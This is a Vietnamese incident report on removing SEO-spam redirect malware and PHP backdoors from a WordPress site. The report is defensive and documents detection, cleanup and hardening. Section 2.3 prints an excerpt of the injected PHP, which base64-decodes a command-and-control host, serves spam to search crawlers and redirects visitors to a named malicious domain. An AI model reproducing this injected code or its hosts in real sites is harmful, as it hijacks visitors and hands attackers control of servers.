# BÁO CÁO GIẢI TRÌNH SỰ CỐ BẢO MẬT WEBSITE 1022.VN

**Ngày lập:** 14/01/2026
**Người thực hiện:** Đội ngũ kỹ thuật
**Trạng thái:** ĐÃ KHẮC PHỤC

---

## 1. NGUYÊN NHÂN WEBSITE BỊ TẤN CÔNG

### 1.1. Phân tích kỹ thuật

Website 1022.vn bị tấn công bởi loại malware **SEO Spam Redirect** kết hợp với **PHP Backdoor**. Đây là hình thức tấn công phổ biến nhắm vào các website WordPress.

### 1.2. Cơ chế hoạt động của malware

Kẻ tấn công đã chèn mã độc vào các file PHP của WordPress với mục đích:

1. **Redirect người dùng từ công cụ tìm kiếm**: Khi người dùng click vào kết quả Google/Bing/Coccoc/Yahoo, họ bị chuyển hướng sang website độc hại `https://vn.fast-bit1142.org:21728/`

2. **Cài đặt backdoor**: Cho phép kẻ tấn công thực thi mã PHP tùy ý từ xa, tạo điều kiện kiểm soát hoàn toàn server

3. **SEO Spam**: Hiển thị nội dung spam cho search engine bots trong khi người dùng bình thường không thấy

### 1.3. Nguyên nhân gốc rễ có thể

- Plugin hoặc theme WordPress có lỗ hổng bảo mật
- Mật khẩu admin/FTP/database yếu hoặc bị lộ
- Phiên bản WordPress/plugin không được cập nhật
- Server không được cấu hình bảo mật đúng cách
- Restore từ bản backup đã bị nhiễm malware

---

## 2. DANH SÁCH FILE BỊ NHIỄM MALWARE ĐÃ XỬ LÝ

### 2.1. File chứa SEO Spam Redirect

| STT | Đường dẫn file | Loại malware | Hành động |
|-----|----------------|--------------|-----------|
| 1 | `/var/www/version2/wp-blog-header.php` | SEO Spam Redirect | **ĐÃ KHÔI PHỤC** code gốc WordPress |
| 2 | `/var/www/version2/wp-news.php` | SEO Spam Redirect | **ĐÃ XÓA** (file không thuộc WordPress core) |

### 2.2. File chứa PHP Backdoor

| STT | Đường dẫn file | Loại malware | Hành động |
|-----|----------------|--------------|-----------|
| 3 | `/var/www/version2/wp-includes/blocks/accordion-item/sjsoun.php` | PHP Backdoor (eval POST) | **ĐÃ XÓA** |
| 4 | `/var/www/version2/phpMyAdmin1022/examples/funation.php` | PHP Backdoor (hex decode + eval) | **ĐÃ XÓA** |
| 5 | `/var/www/version2/1022_bk/wp-exports/exital.php` | PHP Backdoor (temp file include) | **ĐÃ XÓA** |

### 2.3. Chi tiết kỹ thuật malware

**File wp-blog-header.php (TRƯỚC KHI XỬ LÝ):**
```php
<?php
set_time_limit(0);
error_reporting(0);
define('host', base64_decode('aHR0cDovL3h1ZS5pbWFnZTEub25saW5lLw==')); // http://xue.image1.online/

// Kiểm tra nếu là Googlebot/Bingbot/Coccoc
if (isEngines($key)) {
    // Hiển thị nội dung spam cho search bots
    echo getContents(host."?xhost=".$ym.'&reurl='.URI);
} else {
    // Redirect người dùng từ search engine sang website độc hại
    header("Location: https://vn.fast-bit1142.org:21728/?cid=x-jhgb&ref=" . urlencode($ym));
}
```

**Domain độc hại liên quan:**
- `https://vn.fast-bit1142.org:21728/` - Website đích redirect
- `http://xue.image1.online/` - C&C server cung cấp nội dung spam

---

## 3. PHƯƠNG PHÁP KHẮC PHỤC ĐÃ THỰC HIỆN

### 3.1. Bước 1: Điều tra và phát hiện malware

```bash
# Tìm kiếm file chứa URL độc hại
grep -rl "fast-bit1142\|xue.image1.online" /var/www/version2/ --include="*.php"

# Tìm file PHP bị sửa đổi gần đây
find /var/www/version2/ -name "*.php" -mtime -30 -type f

# Tìm file chứa pattern backdoor
grep -rl "eval\s*(\|base64_decode" /var/www/version2/wp-content/
```

### 3.2. Bước 2: Khôi phục file wp-blog-header.php

Thay thế toàn bộ nội dung bị inject bằng code gốc WordPress:

```php
<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {
    $wp_did_header = true;
    require_once __DIR__ . '/wp-load.php';
    wp();
    require_once ABSPATH . WPINC . '/template-loader.php';
}
```

### 3.3. Bước 3: Xóa các file malware/backdoor

```bash
rm -f /var/www/version2/wp-news.php
rm -f /var/www/version2/wp-includes/blocks/accordion-item/sjsoun.php
rm -f /var/www/version2/phpMyAdmin1022/examples/funation.php
rm -f /var/www/version2/1022_bk/wp-exports/exital.php
```

### 3.4. Bước 4: Thiết lập quyền truy cập

```bash
chmod 644 /var/www/version2/wp-config.php
chmod 644 /var/www/version2/.htaccess
chmod 755 /var/www/version2/wp-content/uploads
```

### 3.5. Bước 5: Khởi động lại dịch vụ

```bash
systemctl restart apache2
```

### 3.6. Bước 6: Xác nhận kết quả

```bash
# Kiểm tra không còn file chứa malware
grep -r "fast-bit1142\|xue.image1.online" /var/www/version2/*.php
# Kết quả: 0 file

# Test redirect với Googlebot user-agent
curl -s -A "Googlebot" http://localhost/trang-chu
# Kết quả: Redirect đúng về https://1022.vn/trang-chu (không còn redirect sang domain lạ)
```

---

## 4. KHUYẾN NGHỊ BẢO MẬT CẦN THỰC HIỆN

### 4.1. KHẨN CẤP (Thực hiện ngay)

| STT | Hành động | Lý do | Độ ưu tiên |
|-----|-----------|-------|------------|
| 1 | **Đổi mật khẩu database MySQL** | Password hiện tại đã xuất hiện trong wp-config.php có thể bị lộ | 🔴 CAO |
| 2 | **Đổi mật khẩu admin WordPress** | Tài khoản admin có thể đã bị compromise | 🔴 CAO |
| 3 | **Đổi WordPress Security Keys/Salts** | Vô hiệu hóa tất cả session đăng nhập hiện tại | 🔴 CAO |
| 4 | **Xóa thư mục 1022_bk** | Backup đã bị nhiễm malware, không nên sử dụng | 🔴 CAO |

### 4.2. QUAN TRỌNG (Thực hiện trong 24-48h)

| STT | Hành động | Chi tiết |
|-----|-----------|----------|
| 6 | Update WordPress core | Cập nhật lên phiên bản mới nhất |
| 7 | Update tất cả plugins | Đặc biệt các plugin: W3 Total Cache, WP Hide, Rank Math SEO |
| 8 | Update theme Flatsome | Kiểm tra và cập nhật theme |
| 9 | Cài đặt plugin bảo mật | Wordfence hoặc Sucuri Security |
| 10 | Thiết lập 2FA cho admin | Sử dụng plugin Two-Factor Authentication |

### 4.3. DÀI HẠN (Thực hiện trong 1-2 tuần)

| STT | Hành động | Chi tiết |
|-----|-----------|----------|
| 11 | Cấu hình firewall | Sử dụng fail2ban hoặc CSF |
| 12 | Thiết lập backup tự động | Backup hàng ngày ra location riêng biệt |
| 13 | Cấu hình SSL đúng cách | Force HTTPS cho toàn bộ website |
| 14 | Disable XML-RPC | Nếu không sử dụng, vô hiệu hóa xmlrpc.php |
| 15 | Giới hạn login attempts | Chặn brute force attack |
| 16 | Monitoring & Alerting | Thiết lập cảnh báo khi có file thay đổi bất thường |

### 4.4. Cấu hình .htaccess khuyến nghị

Thêm các rules sau vào file `.htaccess`:

```apache
# Chặn truy cập wp-config.php
<files wp-config.php>
order allow,deny
deny from all
</files>

# Chặn thực thi PHP trong uploads
<Directory "/var/www/version2/wp-content/uploads">
    <FilesMatch "\.php$">
        Order Deny,Allow
        Deny from all
    </FilesMatch>
</Directory>

# Chặn truy cập xmlrpc.php (nếu không sử dụng)
<files xmlrpc.php>
order allow,deny
deny from all
</files>

# Disable directory browsing
Options -Indexes
```

---

## 5. KẾT LUẬN

Website 1022.vn đã bị tấn công bởi malware SEO Spam Redirect kết hợp PHP Backdoor. Sự cố đã được **khắc phục hoàn toàn** vào ngày 14/01/2026.

**Trạng thái hiện tại:**
- ✅ Đã xóa tất cả file malware/backdoor
- ✅ Đã khôi phục file WordPress core
- ✅ Website hoạt động bình thường
- ✅ Không còn redirect sang domain độc hại

**Lưu ý quan trọng:**
- ⚠️ Cần thực hiện các khuyến nghị bảo mật trong mục 4 để ngăn chặn tái phát
- ⚠️ Không restore từ backup `/var/www/version2/1022_bk/` vì đã bị nhiễm malware

---

**Người lập báo cáo:** Đội ngũ kỹ thuật
**Ngày:** 14/01/2026
**Thời gian khắc phục:** ~30 phút
